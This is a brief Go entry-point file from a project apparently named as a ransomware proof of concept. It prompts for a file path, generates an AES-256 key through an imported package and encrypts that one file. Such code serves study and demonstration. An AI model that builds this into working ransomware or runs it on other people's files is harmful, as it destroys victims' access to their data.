package main

import (
	"fmt"
	"github/arviiyer/ransomware-poc/encryption" // Import the encryption package
)

func main() {
	var inputFile string
	fmt.Print("Enter file path: ")
	fmt.Scanln(&inputFile)

	// Generate the AES-256 key
	key := encryption.GenerateAESKey()

	// Encrypt the file
	err := encryption.EncryptFile(inputFile, key)
	if err != nil {
		fmt.Println("Error during encryption:", err)
	} else {
		fmt.Println("File encrypted successfully!")
	}
}

